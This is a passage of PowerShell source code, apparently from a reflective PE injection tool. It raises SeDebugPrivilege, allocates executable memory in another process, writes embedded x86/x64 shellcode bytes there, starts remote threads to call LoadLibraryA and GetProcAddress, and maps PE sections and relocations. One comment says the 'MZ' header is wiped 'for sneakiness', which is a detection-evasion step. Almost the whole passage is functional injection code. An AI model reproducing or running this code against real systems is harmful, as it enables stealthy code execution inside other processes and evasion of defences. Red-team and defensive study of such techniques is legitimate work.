                $Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
                if ($Result -eq $false)
                {
                    Throw "Unable to OpenThreadToken."
                }
            }
            else
            {
                Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
            }
        }

        [IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
        $Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
        if ($Result -eq $false)
        {
            Throw "Unable to call LookupPrivilegeValue"
        }

        [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
        [IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
        $TokenPrivileges.PrivilegeCount = 1
        $TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
        $TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

        $Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
        if (($Result -eq $false) -or ($ErrorCode -ne 0))
        {
            #Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
        }

        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
    }

    Function Create-RemoteThread
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [IntPtr]
        $ProcessHandle,

        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,

        [Parameter(Position = 3, Mandatory = $false)]
        [IntPtr]
        $ArgumentPtr = [IntPtr]::Zero,

        [Parameter(Position = 4, Mandatory = $true)]
        [System.Object]
        $Win32Functions
        )

        [IntPtr]$RemoteThreadHandle = [IntPtr]::Zero

        $OSVersion = [Environment]::OSVersion.Version
        #Vista and Win7
        if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
        {
            #Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
            $RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($RemoteThreadHandle -eq [IntPtr]::Zero)
            {
                Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
            }
        }
        #XP/Win8
        else
        {
            #Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
            $RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
        }

        if ($RemoteThreadHandle -eq [IntPtr]::Zero)
        {
            Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
        }

        return $RemoteThreadHandle
    }

    Function Get-ImageNtHeaders
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )

        $NtHeadersInfo = New-Object System.Object

        #Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
        $dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

        #Get IMAGE_NT_HEADERS
        [IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
        $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
        $imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)

        #Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
        if ($imageNtHeaders64.Signature -ne 0x00004550)
        {
            throw "Invalid IMAGE_NT_HEADER signature."
        }

        if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
        {
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
        }
        else
        {
            $ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
        }

        return $NtHeadersInfo
    }


    #This function will get the information needed to allocated space in memory for the PE
    Function Get-PEBasicInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )

        $PEInfo = New-Object System.Object

        #Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
        [IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null

        #Get NtHeadersInfo
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types

        #Build a structure with the information which will be needed for allocating memory and writing the PE to memory
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)

        #Free the memory allocated above, this isn't where we allocate the PE to memory
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)

        return $PEInfo
    }


    #PEInfo must contain the following NoteProperties:
    #   PEHandle: An IntPtr to the address the PE is loaded to in memory
    Function Get-PEDetailedInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
        {
            throw 'PEHandle is null or IntPtr.Zero'
        }

        $PEInfo = New-Object System.Object

        #Get NtHeaders information
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types

        #Build the PEInfo object
        $PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
        $PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
        $PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
        $PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)

        if ($PEInfo.PE64Bit -eq $true)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        else
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }

        if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
        }
        elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
        }
        else
        {
            Throw "PE file is not an EXE or DLL"
        }

        return $PEInfo
    }

    Function Import-DllInRemoteProcess
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,

        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $ImportDllPathPtr
        )

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
        $DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
        $RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($RImportDllPathPtr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process"
        }

        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)

        if ($Success -eq $false)
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if ($DllPathSize -ne $NumBytesWritten)
        {
            Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }

        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes

        [IntPtr]$DllAddress = [IntPtr]::Zero
        #For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
        #   Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
        if ($PEInfo.PE64Bit -eq $true)
        {
            #Allocate memory for the address returned by LoadLibraryA
            $LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
            }

            #Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
            $LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $LoadLibrarySC2 = @(0x48, 0xba)
            $LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
            $LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)

            $SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
            $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
            $SCPSMemOriginal = $SCPSMem

            Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

            $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($RSCAddr -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for shellcode"
            }

            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
            if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
            {
                Throw "Unable to write shellcode to remote process memory."
            }

            $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }

            #The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
            [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
            $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
            if ($Result -eq $false)
            {
                Throw "Call to ReadProcessMemory failed"
            }
            [IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        else
        {
            [IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }

            [Int32]$ExitCode = 0
            $Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
            if (($Result -eq 0) -or ($ExitCode -eq 0))
            {
                Throw "Call to GetExitCodeThread failed"
            }

            [IntPtr]$DllAddress = [IntPtr]$ExitCode
        }

        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        return $DllAddress
    }

    Function Get-RemoteProcAddress
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,

        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $RemoteDllHandle,

        [Parameter(Position=2, Mandatory=$true)]
        [IntPtr]
        $FunctionNamePtr,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
        )

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        [IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
        #If not loading by ordinal, write the function name to the remote process memory
        if (-not $LoadByOrdinal)
        {
            $FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

            #Write FunctionName to memory (will be used in GetProcAddress)
            $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
            $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($RFuncNamePtr -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process"
            }

            [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw "Unable to write DLL path to remote process memory"
            }
            if ($FunctionNameSize -ne $NumBytesWritten)
            {
                Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
            }
        }
        #If loading by ordinal, just set RFuncNamePtr to be the ordinal number
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }

        #Get address of GetProcAddress
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

        #Allocate memory for the address returned by GetProcAddress
        $GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
        }

        #Write Shellcode to the remote process which will call GetProcAddress
        #Shellcode: GetProcAddress.asm
        [Byte[]]$GetProcAddressSC = @()
        if ($PEInfo.PE64Bit -eq $true)
        {
            $GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $GetProcAddressSC2 = @(0x48, 0xba)
            $GetProcAddressSC3 = @(0x48, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
            $GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
        }
        else
        {
            $GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
            $GetProcAddressSC2 = @(0xb9)
            $GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
            $GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
        }
        $SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
        $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
        $SCPSMemOriginal = $SCPSMem

        Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)

        $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
        if ($RSCAddr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for shellcode"
        }
        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
        if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
        {
            Throw "Unable to write shellcode to remote process memory."
        }

        $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
        $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
        if ($Result -ne 0)
        {
            Throw "Call to CreateRemoteThread to call GetProcAddress failed."
        }

        #The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
        [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
        $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
        if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
        {
            Throw "Call to ReadProcessMemory failed"
        }
        [IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        #Cleanup remote process memory
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }

        return $ProcAddress
    }


    Function Copy-Sections
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $PEBytes,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )

        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)

            #Address to copy the section to
            [IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))

            #SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
            #    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
            #    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
            #    so truncate SizeOfRawData to VirtualSize
            $SizeOfRawData = $SectionHeader.SizeOfRawData

            if ($SectionHeader.PointerToRawData -eq 0)
            {
                $SizeOfRawData = 0
            }

            if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
            {
                $SizeOfRawData = $SectionHeader.VirtualSize
            }

            if ($SizeOfRawData -gt 0)
            {
                Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
                [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
            }

            #If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
            if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
            {
                $Difference = $SectionHeader.VirtualSize - $SizeOfRawData
                [IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
                Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
                $Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
            }
        }
    }


    Function Update-MemoryAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $OriginalImageBase,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )

        [Int64]$BaseDifference = 0
        $AddDifference = $true #Track if the difference variable should be added or subtracted from variables
        [UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)

        #If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
        if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
                -or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
        {
            return
        }


        elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
            $AddDifference = $false
        }
        elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
        }

        #Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
